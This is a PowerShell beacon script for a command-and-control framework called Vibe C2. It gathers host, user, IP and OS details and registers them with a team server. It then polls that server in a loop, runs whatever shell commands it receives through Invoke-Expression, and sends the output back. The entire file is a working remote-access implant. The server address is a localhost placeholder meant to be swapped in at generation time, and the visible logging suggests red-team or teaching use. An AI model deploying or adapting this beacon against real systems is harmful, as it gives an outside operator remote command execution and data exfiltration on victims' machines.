#
# Vibe C2 PowerShell Beacon
# Auto-generated by Vibe C2 Framework
#

# Banner
function Show-Banner {
    Write-Host ""
    Write-Host "ðŸŒŠ  V I B E  C 2  F R A M E W O R K  ðŸŒŠ" -ForegroundColor Cyan
    Write-Host "      PowerShell Beacon Client" -ForegroundColor Cyan
    Write-Host ""
}

# Configuration
$ServerUrl = "http://localhost:8080"  # This will be replaced during generation
$SleepTime = 30
$BeaconId = $null
$TempDir = "$env:TEMP\vibe-c2-$(Get-Random)"

# Create temp directory
New-Item -ItemType Directory -Path $TempDir -Force | Out-Null

# Generate a random beacon ID
function Get-RandomId {
    $chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    $id = ""
    for ($i = 0; $i -lt 10; $i++) {
        $id += $chars[(Get-Random -Maximum $chars.Length)]
    }
    return $id
}

# Gather system information
function Get-SystemInfo {
    Write-Host "[*] Gathering system information..." -ForegroundColor Blue
    
    $ComputerInfo = Get-CimInstance Win32_ComputerSystem
    $OSInfo = Get-CimInstance Win32_OperatingSystem
    $IPAddresses = (Get-NetIPAddress | Where-Object { $_.AddressFamily -eq "IPv4" -and $_.IPAddress -ne "127.0.0.1" }).IPAddress -join ", "
    
    $SystemInfo = @{
        hostname = $ComputerInfo.Name
        username = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
        ip = $IPAddresses
        os = "$($OSInfo.Caption) $($OSInfo.Version)"
    }
    
    Write-Host "Hostname: $($SystemInfo.hostname)"
    Write-Host "Username: $($SystemInfo.username)"
    Write-Host "IP: $($SystemInfo.ip)"
    Write-Host "OS: $($SystemInfo.os)"
    
    return $SystemInfo
}

# Register with the team server
function Register-Beacon {
    Write-Host "[*] Registering with team server..." -ForegroundColor Blue
    
    $SystemInfo = Get-SystemInfo
    $RegisterData = @{
        hostname = $SystemInfo.hostname
        username = $SystemInfo.username
        ip = $SystemInfo.ip
        os = $SystemInfo.os
    } | ConvertTo-Json
    
    try {
        $Response = Invoke-RestMethod -Uri "$ServerUrl/register" -Method Post -Body $RegisterData -ContentType "application/json"
        $BeaconId = $Response
        Write-Host "[+] Registered with ID: $BeaconId" -ForegroundColor Green
        return $BeaconId
    }
    catch {
        Write-Host "[!] Failed to register: $_" -ForegroundColor Red
        return $null
    }
}

# Check in with the team server
function Invoke-CheckIn {
    Write-Host "[*] Checking in with team server..." -ForegroundColor Blue
    
    try {
        $Response = Invoke-RestMethod -Uri "$ServerUrl/check_in" -Method Post -Body "`"$BeaconId`"" -ContentType "application/json"
        
        if ($Response.Length -gt 0) {
            Write-Host "[+] Received tasks" -ForegroundColor Green
            Process-Tasks -Tasks $Response
        }
        else {
            Write-Host "[*] No new tasks" -ForegroundColor Yellow
        }
    }
    catch {
        Write-Host "[!] Check-in failed: $_" -ForegroundColor Red
    }
}

# Process tasks from the team server
function Process-Tasks {
    param([array]$Tasks)
    
    foreach ($Task in $Tasks) {
        $Command = $Task.command
        $TaskId = $Task.id
        
        # Handle different command types
        if ($Command.PSObject.Properties.Name -contains "Shell") {
            $ShellCmd = $Command.Shell
            Write-Host "[*] Executing command: $ShellCmd" -ForegroundColor Yellow
            Execute-ShellCommand -Command $ShellCmd -TaskId $TaskId
        }
        elseif ($Command.PSObject.Properties.Name -contains "Sleep") {
            $NewSleepTime = $Command.Sleep.seconds
            Write-Host "[*] Changing sleep time to $NewSleepTime seconds" -ForegroundColor Yellow
            $SleepTime = $NewSleepTime
            Send-Response -Result "Sleep time set to $SleepTime seconds" -TaskId $TaskId
        }
        elseif ($Command -eq "Terminate") {
            Write-Host "[!] Terminating beacon" -ForegroundColor Red
            Send-Response -Result "Beacon terminated" -TaskId $TaskId
            exit
        }
    }
}

# Execute a shell command
function Execute-ShellCommand {
    param(
        [string]$Command,
        [string]$TaskId
    )
    
    try {
        $Output = ""
        
        # Execute the command using PowerShell
        $Result = Invoke-Expression -Command $Command 2>&1
        
        # Convert the result to string
        foreach ($Line in $Result) {
            $Output += "$Line`n"
        }
        
        # Log the output locally
        Write-Host "[+] Command output:" -ForegroundColor Green
        Write-Host $Output
        
        # Send the response
        Send-Response -Result $Output -TaskId $TaskId
    }
    catch {
        Write-Host "[!] Command execution error: $_" -ForegroundColor Red
        Send-Response -Result "Error: $_" -TaskId $TaskId
    }
}

# Send task response back to the C2 server using the new command_output endpoint
function Send-Response {
    param(
        [string]$Result,
        [string]$TaskId
    )
    
    # Format response for the new command_output endpoint
    $CommandOutput = @{
        beacon_id = $BeaconId
        task_id = $TaskId
        output = $Result
    } | ConvertTo-Json
    
    Write-Host "[*] Sending response to server (task ID: $TaskId)..." -ForegroundColor Blue
    
    try {
        # Updated to use the new command_output endpoint
        $Response = Invoke-RestMethod -Uri "$ServerUrl/command_output" -Method Post -Body $CommandOutput -ContentType "application/json"
        Write-Host "[+] Response sent to team server via new command_output endpoint" -ForegroundColor Green
        
        # Force an immediate check-in
        Write-Host "[*] Forcing immediate check-in to deliver response..." -ForegroundColor Blue
        Invoke-CheckIn
    }
    catch {
        Write-Host "[!] Failed to send response: $_" -ForegroundColor Red
    }
}

# Clean up before exiting
function Invoke-Cleanup {
    Write-Host "[*] Cleaning up..." -ForegroundColor Blue
    Remove-Item -Path $TempDir -Recurse -Force -ErrorAction SilentlyContinue
}

# Main function
function Start-Beacon {
    Show-Banner
    
    # Create temporary directory
    if (!(Test-Path -Path $TempDir)) {
        New-Item -ItemType Directory -Path $TempDir -Force | Out-Null
    }
    
    # Register with the team server
    $BeaconId = Register-Beacon
    if ($null -eq $BeaconId) {
        Write-Host "[!] Registration failed, exiting" -ForegroundColor Red
        Invoke-Cleanup
        return
    }
    
    $script:BeaconId = $BeaconId
    
    Write-Host "[+] Beacon started with ID: $BeaconId" -ForegroundColor Green
    Write-Host "[*] Connecting to: $ServerUrl" -ForegroundColor Blue
    Write-Host "[*] Check-in interval: $SleepTime seconds" -ForegroundColor Blue
    
    # Main beacon loop
    while ($true) {
        Invoke-CheckIn
        Start-Sleep -Seconds $SleepTime
    }
}

# Set up cleanup on exit
$null = Register-EngineEvent -SourceIdentifier PowerShell.Exiting -Action { Invoke-Cleanup }

# Start the beacon
try {
    Start-Beacon
}
catch {
    Write-Host "[!] Unhandled error: $_" -ForegroundColor Red
    Invoke-Cleanup
}
